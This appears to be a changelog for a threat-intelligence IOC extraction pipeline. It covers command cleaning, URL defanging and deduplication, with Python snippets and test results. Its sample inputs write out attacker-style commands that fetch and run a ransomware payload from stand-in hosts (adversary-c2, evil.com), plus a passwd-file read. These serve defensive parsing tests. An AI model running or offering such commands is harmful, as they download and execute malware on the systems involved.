# Command Extraction Improvements - Version 2

## Overview
This document details the latest improvements to command extraction in the Archer IOC extraction pipeline, focusing on better handling of malformed commands, smart quote handling, and URL defanging.

## Changes Made

### 1. Reverted Pipe Stripping
**Previous Behavior**: Commands with pipes (e.g., `cat /etc/passwd | grep root`) were truncated at the pipe.

**New Behavior**: Pipe commands are preserved as-is, since they represent complete adversary commands.

**Example**:
```
Input:  cat /etc/passwd | grep root
Output: cat /etc/passwd | grep root
```

### 2. Enhanced Parentheses Stripping
**Problem**: Malformed commands with trailing regex-like patterns weren't cleaned properly.

**Solution**: Added regex pattern matching to remove trailing patterns like `) or (.exe .dll dump)))`.

**Examples**:
```
Input:  rundll32.exe dump) or (.exe .dll dump)))
Output: rundll32.exe dump

Input:  rundll32.exe dump) or (.exe .dll dump))))
Output: rundll32.exe dump
```

**Implementation**:
```python
# Strip trailing punctuation patterns like ) or (.exe .dll dump)))
cleaned = re.sub(r'\)\s+or\s+\([^)]+\)+$', '', cleaned)

# Remove remaining trailing closing parentheses and spaces
while cleaned.endswith(')') or cleaned.endswith(' '):
    cleaned = cleaned.rstrip(') ')
```

### 3. Smart Quote Stripping
**Problem**: Need to strip trailing quotes only when they're extraneous, not when they're part of the command syntax.

**Solution**: Only strip trailing quotes if there are NO other quotes in the command body.

**Examples**:
```
Strip this trailing quote:
Input:  curl -o ransomware.exe hxxp://adversary-c2/ransomware; start ransomware.exe"
Output: curl -o ransomware.exe hxxp://adversary-c2/ransomware; start ransomware.exe

DON'T strip quotes that are part of syntax:
Input:  curl -o ransomware.exe hxxp://adversary-c2/ransomware; 'start ransomware.exe'
Output: curl -o ransomware.exe hxxp://adversary-c2/ransomware; 'start ransomware.exe'
```

**Implementation**:
```python
# Smart quote stripping: only strip trailing quotes if there are no quotes in the command body
if cleaned:
    # Check for trailing single or double quotes
    if cleaned.endswith('"'):
        # Only strip if there are no other double quotes in the command
        if cleaned[:-1].count('"') == 0:
            cleaned = cleaned[:-1]
    elif cleaned.endswith("'"):
        # Only strip if there are no other single quotes in the command
        if cleaned[:-1].count("'") == 0:
            cleaned = cleaned[:-1]
```

### 4. URL Defanging in Commands
**Problem**: Commands containing URLs should have those URLs defanged for safe display.

**Solution**: Replace `http://` with `hxxp://` and `https://` with `hxxps://` in all commands.

**Examples**:
```
Input:  wget http://adversary-c2/ransomware -o /tmp/ransomware
Output: wget hxxp://adversary-c2/ransomware -o /tmp/ransomware

Input:  curl https://evil.com/payload -o /tmp/payload
Output: curl hxxps://evil.com/payload -o /tmp/payload
```

**Implementation**:
```python
# Defang URLs in commands: http -> hxxp, https -> hxxps
cleaned = re.sub(r'\bhttp://', 'hxxp://', cleaned, flags=re.IGNORECASE)
cleaned = re.sub(r'\bhttps://', 'hxxps://', cleaned, flags=re.IGNORECASE)
```

### 5. Improved Command Similarity Detection
**Problem**: Commands that differ only in URL defanging (or lack thereof) should be treated as duplicates.

**Solution**: Normalize URLs to `http://` format before comparison, then keep the defanged version.

**Examples**:
```
These two commands are now treated as duplicates:
- wget http://adversary-c2/ransomware -o /tmp/ransomware; chmod +x /tmp/ransomware; /tmp/ransomware
- wget hxxp://adversary-c2/ransomware -o /tmp/ransomware; chmod +x /tmp/ransomware; /tmp/ransomware

Result: Keep only the defanged version (hxxp)
```

**Implementation**:
```python
# Normalize both commands for comparison (handle URL defanging variations)
norm_cmd1 = cmd1.replace('hxxp://', 'http://').replace('hxxps://', 'https://')
norm_cmd2 = cmd2.replace('hxxp://', 'http://').replace('hxxps://', 'https://')

# Check if commands are identical after normalization
if norm_cmd1 == norm_cmd2:
    # Keep the defanged version (with hxxp) if one exists
    if 'hxxp' in cmd1:
        skip_indices.add(j)  # cmd1 has hxxp, skip cmd2
    else:
        skip_indices.add(i)  # cmd2 has hxxp, skip cmd1 and use cmd2
        break
```

## Complete Pipeline

The command extraction and cleaning pipeline now follows this order:

1. **Extract commands** using regex patterns
2. **Strip descriptions** after `: ` separator
3. **Strip whitespace** and trailing dots
4. **Strip malformed patterns** like `) or (.exe .dll dump)))`
5. **Strip remaining parentheses** and spaces
6. **Strip trailing punctuation** (`:,;`)
7. **Smart quote stripping** (only if no quotes in command body)
8. **Defang URLs** (http → hxxp)
9. **Convert to lowercase**
10. **Deduplicate** exact matches
11. **Merge similar commands** (including defanged/non-defanged URL duplicates)

## Test Results

```
=== COMMAND CLEANING TESTS ===

Input:  rundll32.exe dump) or (.exe .dll dump)))
Output: rundll32.exe dump

Input:  rundll32.exe dump) or (.exe .dll dump))))
Output: rundll32.exe dump

Input:  curl -o ransomware.exe hxxp://adversary-c2/ransomware; start ransomware.exe
Output: curl -o ransomware.exe hxxp://adversary-c2/ransomware; start ransomware.exe

Input:  curl -o ransomware.exe hxxp://adversary-c2/ransomware; start ransomware.exe"
Output: curl -o ransomware.exe hxxp://adversary-c2/ransomware; start ransomware.exe

Input:  curl -o ransomware.exe hxxp://adversary-c2/ransomware; 'start ransomware.exe'
Output: curl -o ransomware.exe hxxp://adversary-c2/ransomware; 'start ransomware.exe'

Input:  wget http://adversary-c2/ransomware -o /tmp/ransomware; chmod +x /tmp/ransomware; /tmp/ransomware
Output: wget hxxp://adversary-c2/ransomware -o /tmp/ransomware; chmod +x /tmp/ransomware; /tmp/ransomware

Input:  wget hxxp://adversary-c2/ransomware -o /tmp/ransomware; chmod +x /tmp/ransomware; /tmp/ransomware
Output: wget hxxp://adversary-c2/ransomware -o /tmp/ransomware; chmod +x /tmp/ransomware; /tmp/ransomware

Input:  cat /etc/passwd | grep root
Output: cat /etc/passwd | grep root

=== DEDUPLICATION TEST ===

Before deduplication: 8 commands
After deduplication:  5 commands

=== MERGE SIMILAR COMMANDS ===

After merging similar: 5 commands
  - cat /etc/passwd | grep root
  - curl -o ransomware.exe hxxp://adversary-c2/ransomware; 'start ransomware.exe'
  - curl -o ransomware.exe hxxp://adversary-c2/ransomware; start ransomware.exe
  - rundll32.exe dump
  - wget hxxp://adversary-c2/ransomware -o /tmp/ransomware; chmod +x /tmp/ransomware; /tmp/ransomware

✅ ALL TESTS PASSED
```

## Files Modified

- **archer/parsers/file_intelligence.py** (lines 657-758)
  - Command extraction and cleaning logic
  - URL defanging in commands
  - Smart quote stripping
  - Enhanced parentheses removal
  - Improved similarity detection with URL normalization

## Benefits

1. **Cleaner Commands**: Malformed patterns and trailing garbage removed
2. **Safe Display**: All URLs defanged automatically
3. **Smart Processing**: Preserves intentional quotes and pipes
4. **Better Deduplication**: Handles defanged/non-defanged URL variations
5. **More Accurate**: Reduces false positives and duplicate commands

## Summary

These improvements make command extraction more robust and accurate, handling edge cases like malformed commands, URL defanging, and smart quote processing. The result is cleaner, safer, and more accurate command IOCs for threat detection.
